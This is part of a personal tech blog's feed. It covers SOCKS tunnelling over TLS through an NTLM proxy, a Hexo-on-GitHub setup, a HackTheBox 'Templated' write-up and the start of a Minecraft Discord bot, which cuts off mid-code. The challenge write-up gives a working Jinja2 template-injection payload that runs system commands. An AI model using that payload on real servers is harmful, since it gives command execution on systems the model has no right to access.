bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service cntlm start</span><br></pre></td></tr></table></figure><p>By default cntlm listen on 127.0.0.1:3128.  </p><h2 id="Configure-ssf-client"><a href="#Configure-ssf-client" class="headerlink" title="Configure ssf (client)"></a>Configure ssf (client)</h2><p>To use ssf you need to generate some files.<br>You can use these command lines to generate them :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># chmod +x</span></span><br><span class="line"></span><br><span class="line">folder=<span class="string">&#x27;certs&#x27;</span></span><br><span class="line">keySize=<span class="string">&#x27;1024&#x27;</span></span><br><span class="line"></span><br><span class="line">mv certs certs.old.<span class="variable">$RANDOM</span> &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">mkdir <span class="variable">$folder</span></span><br><span class="line">mkdir <span class="variable">$folder</span>/trusted</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$folder</span></span><br><span class="line"></span><br><span class="line">openssl dhparam -outform PEM -out dh<span class="variable">$&#123;keySize&#125;</span>.pem <span class="variable">$keySize</span></span><br><span class="line">openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -subj <span class="string">&quot;/C=GB/ST=London/L=London/O=Tunnel/OU=IT/CN=ufns&quot;</span></span><br><span class="line"></span><br><span class="line">cat &gt; extfile.txt &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[ v3_req_p ]</span></span><br><span class="line"><span class="string">basicConstraints = CA:FALSE</span></span><br><span class="line"><span class="string">keyUsage = nonRepudiation, digitalSignature, keyEncipherment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[ v3_ca_p ]</span></span><br><span class="line"><span class="string">basicConstraints = CA:TRUE</span></span><br><span class="line"><span class="string">keyUsage = nonRepudiation, digitalSignature, keyEncipherment, keyCertSign</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr -subj <span class="string">&quot;/C=GB/ST=London/L=London/O=Tunnel/OU=IT/CN=xetg&quot;</span></span><br><span class="line"></span><br><span class="line">openssl x509 -extfile extfile.txt -extensions v3_req_p -req -sha1 -days 3650 -CA ca.crt -CAkey ca.key -CAcreateserial -<span class="keyword">in</span> certificate.csr -out certificate.crt</span><br><span class="line"></span><br><span class="line">mv ca.crt trusted</span><br></pre></td></tr></table></figure><p>Now, after you copy/paste the code in SSF folder and run it. You get:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">certs</span><br><span class="line">├── ca.key</span><br><span class="line">├── ca.srl</span><br><span class="line">├── certificate.crt</span><br><span class="line">├── certificate.csr</span><br><span class="line">├── dh1024.pem</span><br><span class="line">├── extfile.txt</span><br><span class="line">├── private.key</span><br><span class="line">└── trusted</span><br><span class="line">    └── ca.crt</span><br></pre></td></tr></table></figure><h2 id="Create-SSF-config-file"><a href="#Create-SSF-config-file" class="headerlink" title="Create SSF config file"></a>Create SSF config file</h2><p>Create the file config.json in SSF folder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;ssf&quot;: &#123;</span><br><span class="line">    &quot;tls&quot; : &#123;</span><br><span class="line">      &quot;ca_cert_path&quot;: &quot;.&#x2F;certs&#x2F;trusted&#x2F;ca.crt&quot;,</span><br><span class="line">      &quot;cert_path&quot;: &quot;.&#x2F;certs&#x2F;certificate.crt&quot;,</span><br><span class="line">      &quot;key_path&quot;: &quot;.&#x2F;certs&#x2F;private.key&quot;,</span><br><span class="line">      &quot;key_password&quot;: &quot;&quot;,</span><br><span class="line">      &quot;dh_path&quot;: &quot;.&#x2F;certs&#x2F;dh1024.pem&quot;,</span><br><span class="line">      &quot;cipher_alg&quot;: &quot;DHE-RSA-AES256-GCM-SHA384&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;http_proxy&quot; : &#123;</span><br><span class="line">      &quot;host&quot; : &quot;127.0.0.1&quot;,</span><br><span class="line">      &quot;port&quot; : 3128,</span><br><span class="line">      &quot;credential&quot; : &#123;</span><br><span class="line">        &quot;reuse_ntlm&quot; : &quot;false&quot;,</span><br><span class="line">        &quot;reuse_nego&quot; : &quot;false&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You need to configure the path of “keys” elements and cntlm proxy</p><p>Now it is is finish, you can copy/paste “certs” folder and config.jon on the remote host (VPS or whatever …) in SSF folder, and start the deamon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssfd -p 443</span><br></pre></td></tr></table></figure><p>You can add “-v debug” to show more log.</p><p>On client side, in SSF folder, start the tunnel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssf -D 1080 -p 443 [IP/Host]</span><br></pre></td></tr></table></figure><p>If your configuration in OK you will get :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./ssf -D 1080 -p 443 127.0.0.1  </span><br><span class="line">[config] loading file &lt;config.json&gt;  </span><br><span class="line">[config] [tls] CA cert path: &lt;file: ./certs/trusted/ca.crt&gt;  </span><br><span class="line">[config] [tls] cert path: &lt;file: ./certs/certificate.crt&gt;</span><br><span class="line">[config] [tls] key path: &lt;file: ./certs/private.key&gt;</span><br><span class="line">[config] [tls] key password: &lt;&gt;</span><br><span class="line">[config] [tls] dh path: &lt;file: ./certs/dh1024.pem&gt;</span><br><span class="line">[config] [tls] cipher suite: &lt;DHE-RSA-AES256-GCM-SHA384&gt;</span><br><span class="line">[config] [http proxy] &lt;None&gt;</span><br><span class="line">[config] [socks proxy] &lt;None&gt;</span><br><span class="line">[config] [circuit] &lt;None&gt;</span><br><span class="line">[ssf] connecting to &lt;127.0.0.1:8011&gt;</span><br><span class="line">[ssf] running (Ctrl + C to stop)</span><br><span class="line">[client] connection attempt 1/1</span><br><span class="line">[client] connected to server</span><br><span class="line">[client] running</span><br><span class="line">[microservice] [stream_listener]: forward TCP connections from &lt;127.0.0.1:1080&gt; to 1080</span><br><span class="line">[client] service &lt;socks&gt; OK</span><br></pre></td></tr></table></figure><p>Now the socks tunnel is UP and listen on 127.0.0.1:1080.<br>You can configure Firefox to use it + foxyProxy plugin.</p><p><img src="/2021/01/18/HTTPS-Tunneling/firefox.png" alt="firefox"></p><p>If you need to have the ssfd running in background you can use <a href="https://linux.die.net/man/1/screen">screen</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/01/18/HTTPS-Tunneling/network-header.png&quot; alt=&quot;header&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="socks" scheme="https://0x25.github.io/tags/socks/"/>
    
    <category term="Tunnel" scheme="https://0x25.github.io/tags/Tunnel/"/>
    
    <category term="HTTPS/TLS" scheme="https://0x25.github.io/tags/HTTPS-TLS/"/>
    
    <category term="ssf" scheme="https://0x25.github.io/tags/ssf/"/>
    
    <category term="cntlm" scheme="https://0x25.github.io/tags/cntlm/"/>
    
  </entry>
  
  <entry>
    <title>Create your  blog on Github</title>
    <link href="https://0x25.github.io/2021/01/05/Create-your-blog-on-Github/"/>
    <id>https://0x25.github.io/2021/01/05/Create-your-blog-on-Github/</id>
    <published>2021-01-05T09:26:38.000Z</published>
    <updated>2021-01-05T10:50:42.453Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/01/05/Create-your-blog-on-Github/Hexo-header.png"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Explain how I create this blog with hexo and github.<br>I wanted to be able to write markdown posts and host them on github.</p><h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><ul><li>Node.js</li><li>git</li><li>bash</li></ul><h1 id="Which-blog-framework"><a href="#Which-blog-framework" class="headerlink" title="Which blog framework"></a>Which blog framework</h1><p>There is several blog framework. But for our case we need to generate a static blog to commit on our repository (github).<br>I search on google and find <a href="https://hexo.io/">hexo</a> : <strong>A fast, simple &amp; powerful blog framework</strong>, it is based on Node.js. </p><h1 id="Prepare-your-github-repository"><a href="#Prepare-your-github-repository" class="headerlink" title="Prepare your github repository"></a>Prepare your github repository</h1><p>Github offers the possibility to have a web site with a domain like “username.github.io”. All information to activate it can be found here <a href="https://pages.github.com/">Github Page</a>.<br>Configure github to access it with SSH. Have a look <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh">here</a>.</p><h1 id="Installing-Hexo-and-configuration"><a href="#Installing-Hexo-and-configuration" class="headerlink" title="Installing Hexo and configuration"></a>Installing Hexo and configuration</h1><p>I am not going to write the hexo doc but all information is on the official hexo <a href="https://hexo.io/docs/">website</a>.</p><p>Once you have installed the package we can start our blog:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>Once initialized, here’s what your project folder will look like:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.  </span><br><span class="line">├── _config.yml  </span><br><span class="line">├── package.json  </span><br><span class="line">├── scaffolds  </span><br><span class="line">├── <span class="built_in">source</span>  </span><br><span class="line">|   ├── _drafts  </span><br><span class="line">|   └── _posts  </span><br><span class="line">└── themes  </span><br></pre></td></tr></table></figure><p>If you <a href="https://hexo.io/docs/writing">create a new post</a> and <a href="https://hexo.io/docs/generating">generate the blog</a>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>A “public” folder will be create with the static web site. <strong>This is this folder</strong> we want to commit to our github repository.</p><p>Create or go to the “public” folder and <a href="https://kbroman.org/github_tutorial/pages/init.html">init the repository</a>.</p><p>Create a .gitignore file with the following content:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat .gitignore                                                                                                                              </span><br><span class="line">.*</span><br><span class="line">*.sh</span><br></pre></td></tr></table></figure><p>Now we are going to create a Bash script to automatically commit the repository. We want to do fresh commit without old branch. This effectively deletes old articles.<br>Create “publish.sh” in “public” folder.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># chmod +x publish.sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">date=$(date <span class="string">&quot;+%d-%m-%Y %T&quot;</span>)</span><br><span class="line">commit_name=<span class="string">&quot;Update <span class="variable">$&#123;date&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create tmp branch</span></span><br><span class="line">git checkout --orphan TEMP_BRANCH</span><br><span class="line"></span><br><span class="line">git add -A</span><br><span class="line"></span><br><span class="line">git commit -m <span class="string">&quot;<span class="variable">$commit_name</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete old branch</span></span><br><span class="line">git branch -D main</span><br><span class="line"></span><br><span class="line"><span class="comment"># rename tmp branch to main</span></span><br><span class="line">git branch -m main</span><br><span class="line"></span><br><span class="line"><span class="comment"># force update</span></span><br><span class="line">git push -f origin main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now go back to your hexo folder (cd ..) and create a new bash script “hexo_generate.sh”:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># chmod +x hexo_generate.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clean public to sync source/_post , maybe unnecessary :D</span></span><br><span class="line">rm -rf public/202* public/archives public/css public/fancybox public/index.html public/js public/tags public/atom.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean db</span></span><br><span class="line">rm db.json</span><br><span class="line"></span><br><span class="line">hexo generate --deploy --force</span><br><span class="line"></span><br><span class="line"><span class="comment"># run git add commit push </span></span><br><span class="line">(<span class="built_in">cd</span> public &amp;&amp; ./publish.sh)</span><br></pre></td></tr></table></figure><p><em>Don’t forget to chmod +x .sh script.</em></p><p>Now you can create articles and automatically publish the blog on github. </p><p><img src="/2021/01/05/Create-your-blog-on-Github/Hexo-generate.png"></p><p>That’s it that’s all \o/</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/01/05/Create-your-blog-on-Github/Hexo-header.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;headerlink&quot; title=&quot;Purp</summary>
      
    
    
    
    
    <category term="hexo" scheme="https://0x25.github.io/tags/hexo/"/>
    
    <category term="github" scheme="https://0x25.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox challenge web templated</title>
    <link href="https://0x25.github.io/2021/01/03/HackTheBox-challenge-web-templated/"/>
    <id>https://0x25.github.io/2021/01/03/HackTheBox-challenge-web-templated/</id>
    <published>2021-01-03T14:58:08.000Z</published>
    <updated>2021-01-03T19:52:28.572Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/01/03/HackTheBox-challenge-web-templated/HTB-header.jpeg"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Solving web challenge (<strong>Templated</strong>) from <a href="https://hackthebox.eu/">Hackthebox.eu</a><br>The only info we get is the name of the challenge.</p><h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><p>Access the web page give us this information</p><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Access-index.png"></p><ul><li>Flask is a lightweight WSGI (Web Server Gateway Interface) web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications</li><li>Jinja2 is a modern and designer-friendly templating language for Python </li></ul><p>I run some tools like <a href="https://github.com/OJ/gobuster">gobuster</a> but … nothing</p><p>So I search on google about “Jinja template pentest” and find this link <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p><p>So I try to inject value like &lcub;&lcub;1&plus;1&rcub;&rcub; on the page (header/URl ..) and find the exploitation</p><details>  <summary>Spoiler warning</summary><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Find-injection.png"></p></details><p>The payload &lcub;&lcub;self&period;&lowbar;&lowbar;dict&lowbar;&lowbar;&rcub;&rcub; is also fun</p><p>Now we know where to inject code we can try to exploit some example we read in the article :D</p><p>For example running the code:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Will execute the Linux command “id”</p><details>  <summary>Spoiler warning</summary><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Execute-id.png"></p></details><p>The command is correctly executed; so we can try to enumerate files on the server.</p><details>  <summary>Spoiler warning</summary><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Execute-ls.png"></p></details><p>Know we find the file with the flag we can read it with “cat”</p><details>  <summary>Spoiler warning</summary><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Execute-cat.png"></p></details><p>We get the flag \o/</p><p>For information doing an “Active Scan” in Burp Pro allow to find the vulnerability directly :D</p><p><img src="/2021/01/03/HackTheBox-challenge-web-templated/Burp-active-scan.png"></p><p>Enjoy.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/01/03/HackTheBox-challenge-web-templated/HTB-header.jpeg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
    <category term="hackthebox" scheme="https://0x25.github.io/tags/hackthebox/"/>
    
    <category term="web" scheme="https://0x25.github.io/tags/web/"/>
    
    <category term="challenge" scheme="https://0x25.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>Create a discord bot for minecraft bedrock docker</title>
    <link href="https://0x25.github.io/2020/12/23/Create-a-discord-bot-for-minecraft-bedrock-docker/"/>
    <id>https://0x25.github.io/2020/12/23/Create-a-discord-bot-for-minecraft-bedrock-docker/</id>
    <published>2020-12-23T17:10:12.000Z</published>
    <updated>2021-01-03T16:48:53.760Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/12/23/Create-a-discord-bot-for-minecraft-bedrock-docker/BDS-discord-header.png"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Explain how I create a discord bot for Minecraft bedrock on docker.<br>No explanation on docker while be done here but there is a lot of tutorial for installing docker on server.</p><h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><ul><li>a Linux server (at home or on Internet)</li><li>python3</li><li>linux screen (sudo apt-get install screen)</li><li>create a dev account on discord <a href="https://discord.com/developers">https://discord.com/developers</a> and create a bot</li></ul><h1 id="Minecraft-docker"><a href="#Minecraft-docker" class="headerlink" title="Minecraft docker"></a>Minecraft docker</h1><p>After you fully installed docker on the server start the Minecraft bedrock container from dockerhub:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it --name Minecraft \</span><br><span class="line">        -e EULA=TRUE \</span><br><span class="line">        -p 19132:19132/udp \</span><br><span class="line">        -e LEVEL_NAME=<span class="string">&#x27;NightMare&#x27;</span> \</span><br><span class="line">        -e LEVEL_SEED=789905374 \</span><br><span class="line">        -e SERVER_NAME=<span class="string">&#x27;MyServer&#x27;</span> \</span><br><span class="line">        -e MAX_PLAYERS=5 \</span><br><span class="line">        -e DEFAULT_PLAYER_PERMISSION_LEVEL=member \</span><br><span class="line">        -e GAMEMODE=survival \</span><br><span class="line">        -e DIFFICULTY=hard \</span><br><span class="line">        itzg/minecraft-bedrock-server</span><br></pre></td></tr></table></figure><p>The full documentation of this container is here <a href="https://hub.docker.com/r/itzg/minecraft-bedrock-server">https://hub.docker.com/r/itzg/minecraft-bedrock-server</a></p><p>Know you will have something like :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                           COMMAND                  CREATED             STATUS                    PORTS                      NAMES</span><br><span class="line">5246641c80da        itzg/minecraft-bedrock-server   <span class="string">&quot;/usr/local/bin/entr…&quot;</span>   3 hours ago         Up 39 minutes (healthy)   0.0.0.0:19132-&gt;19132/udp   Minecraft</span><br></pre></td></tr></table></figure><p>to interact with the server you need to do:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker attach Minecraft</span><br><span class="line">DEBU[2562] Forwarding signal                             signal=<span class="string">&quot;window changed&quot;</span></span><br><span class="line">DEBU[2562] Forwarding signal                             signal=<span class="string">&quot;window changed&quot;</span></span><br><span class="line">list</span><br><span class="line">There are 0/5 players online:</span><br></pre></td></tr></table></figure><ul><li>docker attach “name|id” : to enter docker cli</li><li>list : to list users connected (<a href="https://minecraftbedrock.fandom.com/wiki/Commands/List_of_Commands">https://minecraftbedrock.fandom.com/wiki/Commands/List_of_Commands</a>). we don’t need the / before the command</li></ul><p>Okay, now we have a Minecraft server and we can send command to it \o/.</p><p>To exit (docker) CTRL+P CTRL+Q. If you run CTRL+C you exit the docker and he stop :/</p><p>Now we are going to use “screen” to keep the “docker attach” open even we close our term/ssh.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S Minecraft</span><br><span class="line">$ docker attach Minecraft</span><br><span class="line">CTRL+A CTRL+D</span><br></pre></td></tr></table></figure><ul><li>screen -S Minecraft: to create a screen with name “Minecraft”</li><li>docker attach : to open console mode of the container</li><li>CTRL+A CTRL+D : to exit the screen and keep running the code inside</li></ul><p>Now we have a screen session open (screen -ls to list), but how can we send Minecraft command on it !!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S Minecraft -p 0 -X stuff &quot;weather clear^M&quot;</span><br></pre></td></tr></table></figure><ul><li>-S : session name</li><li>-p : preselect window</li><li>-X : send command </li><li>^M : Enter</li></ul><p>Here we send the command “weather clear” to the server.</p><h1 id="Extract-some-log-from-docker"><a href="#Extract-some-log-from-docker" class="headerlink" title="Extract some log from docker"></a>Extract some log from docker</h1><p>If we want to extract user connection and disconnection we can trace the log of the server.</p><p>For that we can create a job with bash to extract last log  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs --since=1m Minecraft &gt; /var/<span class="built_in">log</span>/dockerMinecraftLast.log</span><br></pre></td></tr></table></figure><p>With this code we can extract last log from 1 min.</p><p>If you add it to crontab you can schedule the task every minute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -e</span><br><span class="line">* * * * * /PathToTheScript/lastDockerMinecraftLog.sh</span><br></pre></td></tr></table></figure><h1 id="The-bot"><a href="#The-bot" class="headerlink" title="The bot"></a>The bot</h1><p>code not fully optimized :D</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> discord</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> bdsPing <span class="keyword">import</span> bdsPing</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">server=<span class="string">&#x27;YourServerIP&#x27;</span></span><br><span class="line">port=<span class="number">19132</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClient</span>(<span class="params">discord.Client</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create the background task and run it in the background</span></span><br><span class="line">        self.bg_task = self.loop.create_task(self.my_background_task())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_ready</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;Logged in as&#x27;</span>)</span><br><span class="line">        print(self.user.name)</span><br><span class="line">        print(self.user.<span class="built_in">id</span>)</span><br><span class="line">        print(<span class="string">&#x27;------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">self, message</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!server&#x27;</span>):</span><br><span class="line">            datas = bdsPing(server,port)</span><br><span class="line">            <span class="keyword">await</span> message.channel.send(<span class="string">&quot;Server: &#123;&#125;:&#123;&#125;\nServer Name: &#123;&#125;\nPlayer: &#123;&#125;/&#123;&#125;\nGame Mode: 